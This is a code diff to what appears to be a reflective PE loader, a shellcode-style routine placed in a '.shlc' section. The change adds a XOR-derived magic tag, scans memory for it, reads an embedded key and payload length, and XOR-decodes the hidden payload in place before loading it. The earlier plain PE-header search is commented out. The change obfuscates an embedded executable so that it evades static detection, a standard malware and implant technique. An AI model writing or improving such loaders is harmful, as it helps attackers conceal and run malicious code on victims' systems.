@@ -18,6 +18,11 @@
 #include <stdio.h>
 #endif
 
+constexpr DWORD TAG_PAYLOAD_BEGIN = 'L41N';
+constexpr DWORD TAG_PAYLOAD_KEY = 'd00t';
+constexpr DWORD TAG_PAYLOAD_VAL = TAG_PAYLOAD_BEGIN ^ TAG_PAYLOAD_KEY;
+#define IS_TAG_MAGIC( x ) ((x ^ TAG_PAYLOAD_KEY) == TAG_PAYLOAD_VAL)
+
 #define MAXIMUM_HEADER_SEARCH_BYTES 0x3000
 
 #define ERROR_HDR_NOT_FOUND -1
@@ -61,24 +66,58 @@ typedef struct
 
 // BEGIN LOADER FUNCTION
 #pragma intrinsic(strlen)
+#pragma intrinsic(memcmp)
 #pragma runtime_checks("", off)
 __declspec(code_seg(".shlc"))
 __declspec(guard(ignore))
 __declspec(safebuffers)
 uintptr_t load(uintptr_t current_base) {
-	// find the offset of the payload from our reflective loader prelude
-	DWORD cbPeHeaderOffset = 0;
+
+	DWORD cbXorHeaderOffset = 0;
+	DWORD dwLenPayload = 0;
 	uintptr_t old_base_addr = current_base;
-	while (cbPeHeaderOffset < MAXIMUM_HEADER_SEARCH_BYTES) {
-		if (IS_PE_MAGIC(*(WORD*)old_base_addr)) {
+	DWORD dwTagOffset = 0;
+	DWORD dwXorKeyLen = 0;
+	PBYTE pXorKey = NULL;
+	// find the offset of the payload tag fom our reflective loader prelude
+	while (cbXorHeaderOffset < MAXIMUM_HEADER_SEARCH_BYTES) {
+		if (IS_TAG_MAGIC(*(PDWORD)old_base_addr)) {
+			old_base_addr += sizeof(DWORD);
+			dwXorKeyLen = *(PDWORD)old_base_addr;
+			old_base_addr += sizeof(DWORD);
+			dwLenPayload = *(PDWORD)old_base_addr;
+			old_base_addr += sizeof(DWORD);
+			pXorKey = (PBYTE)(old_base_addr);
+			old_base_addr += dwXorKeyLen;
 			break;
 		}
 		old_base_addr++;
+		cbXorHeaderOffset++;
 	}
-	if (cbPeHeaderOffset == MAXIMUM_HEADER_SEARCH_BYTES)
+	if (cbXorHeaderOffset == MAXIMUM_HEADER_SEARCH_BYTES)
 	{
 		return ERROR_HDR_NOT_FOUND;
 	}
+
+	// xor decode the payload
+	for (size_t i = 0; i < dwLenPayload; i++)
+	{
+		((PBYTE)old_base_addr)[i] ^= pXorKey[i % dwXorKeyLen];
+	}
+
+
+	// find the offset of the payload from our reflective loader prelude
+	
+	//while (cbPeHeaderOffset < MAXIMUM_HEADER_SEARCH_BYTES) {
+	//	if (IS_PE_MAGIC(*(WORD*)old_base_addr)) {
+	//		break;
+	//	}
+	//	old_base_addr++;
+	//}
+	//if (cbPeHeaderOffset == MAXIMUM_HEADER_SEARCH_BYTES)
+	//{
+	//	return ERROR_HDR_NOT_FOUND;
+	//}
 
 	// begin initialize loader data
 	uintptr_t ntbase = (uintptr_t)getNtdll();
